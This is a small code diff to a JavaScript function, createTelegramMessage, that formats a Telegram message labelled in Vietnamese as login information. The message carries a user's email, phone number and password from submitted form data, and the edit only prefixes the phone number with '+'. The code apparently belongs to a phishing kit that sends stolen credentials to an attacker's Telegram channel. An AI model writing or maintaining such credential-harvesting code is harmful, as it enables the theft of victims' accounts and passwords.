@@ -67,7 +67,7 @@ const createTelegramMessage = (
 ━━━━━━━━━━━━━━━━━━━━━
 🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
 📧 <b>Email:</b> <code>${formData.email}</code>
-📞 <b>Số Điện Thoại:</b> <code>${formData.phone}</code>
+📞 <b>Số Điện Thoại:</b> <code>+${formData.phone}</code>
 ${passwordLabel} <code>${password}</code>`;
 };
 
